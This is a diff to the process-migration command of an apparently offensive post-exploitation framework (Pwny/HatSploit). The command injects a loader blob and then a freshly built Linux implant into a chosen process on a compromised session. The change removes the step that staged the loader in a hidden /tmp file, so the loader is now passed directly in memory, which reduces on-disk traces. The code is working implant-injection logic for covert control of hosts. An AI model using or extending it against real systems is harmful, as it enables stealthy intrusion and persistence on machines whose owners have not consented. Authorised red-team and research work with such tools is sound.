@@ -32,8 +32,6 @@ from pwny.api import *
 from pwny.types import *
 
 from badges import Badges
-from pex.string import String
-
 from hatsploit.lib.core.session import Session
 
 
@@ -64,55 +62,26 @@ class Migrate(Badges):
 
         self.print_process(f"Migrating to {str(pid)}...")
 
-        loader_path = '/tmp/.' + String().random_string(8)
         tib_path = (self.session.pwny_tibs +
                     str(self.session.info['Platform']) +
                     '/' + str(self.session.info['Arch']) +
-                    '/loader')
+                    '/ldr')
 
         if os.path.exists(tib_path):
             with open(tib_path, 'rb') as f:
                 data = f.read()
 
-                self.print_process(f"Uploading TIB ({str(len(data))} bytes)...")
-                self.session.upload(tib_path, loader_path)
-
-                tlv = self.session.send_command(
-                    tag=FS_CHMOD,
-                    args={
-                        TLV_TYPE_PATH: loader_path,
-                        FS_TYPE_MODE: 777
-                    }
-                )
-
-                if tlv.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-                    self.session.send_command(
-                        tag=FS_FILE_DELETE,
-                        args={
-                            TLV_TYPE_PATH: loader_path
-                        }
-                    )
-
-                    raise RuntimeError("Failed to upload TIB!")
-
-                self.print_process(f"Injecting TIB to {str(pid)}...")
+                self.print_process(f"Injecting TIB ({str(len(data))} bytes)...")
                 tlv = self.session.send_command(
                     tag=PROCESS_MIGRATE,
                     args={
                         TLV_TYPE_PID: pid,
-                        TLV_TYPE_MIGRATE: loader_path
+                        TLV_TYPE_MIGRATE: data
                     }
                 )
 
                 if tlv.get_int(TLV_TYPE_STATUS) != TLV_STATUS_QUIT:
-                    self.session.send_command(
-                        tag=FS_FILE_DELETE,
-                        args={
-                            TLV_TYPE_PATH: loader_path
-                        }
-                    )
-
-                    raise RuntimeError(f"Failed to migrate to {str(pid)}!")
+                    raise RuntimeError("Failed to inject TIB!")
 
                 implant = Pwny(
                     target='x86_64-linux-musl').to_binary('bin')
@@ -124,15 +93,7 @@ class Migrate(Badges):
                 self.print_process("Waiting for the implant...")
                 self.session.open(self.session.channel.client)
                 self.session.channel.secure = False
-
-                self.print_process("Cleaning up...")
-                self.session.send_command(
-                    tag=FS_FILE_DELETE,
-                    args={
-                        TLV_TYPE_PATH: loader_path
-                    }
-                )
         else:
-            raise RuntimeError(f"TIB was not found for {platform}/{arch}!")
+            raise RuntimeError(f"TIB was not found!")
 
         self.print_success(f"Successfully migrated to {str(pid)}")
